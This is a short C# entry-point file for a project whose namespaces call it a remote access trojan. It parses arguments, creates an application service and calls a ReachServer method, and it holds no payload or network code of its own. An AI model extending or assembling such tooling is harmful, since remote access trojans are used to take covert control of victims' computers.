using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Company.Tools.RemoteAccessTrojan.Application;
using Company.Tools.RemoteAccessTrojan.Infrastructure.CrossCutting;

namespace Company.Tools.RemoteAccessTrojan.Server
{
    class Program
    {
        static void Main(string[] args)
        {
            using (var terminal = new Terminal())
            {
                try
                {
                    Config.Current = Config.Parse(args);

                    var service = new ApplicationServiceFactory().Create();
                    service.ReachServer();
                }
                catch (Exception ex)
                {
                    terminal.WriteError(ex);
                }
            }
        }
    }
}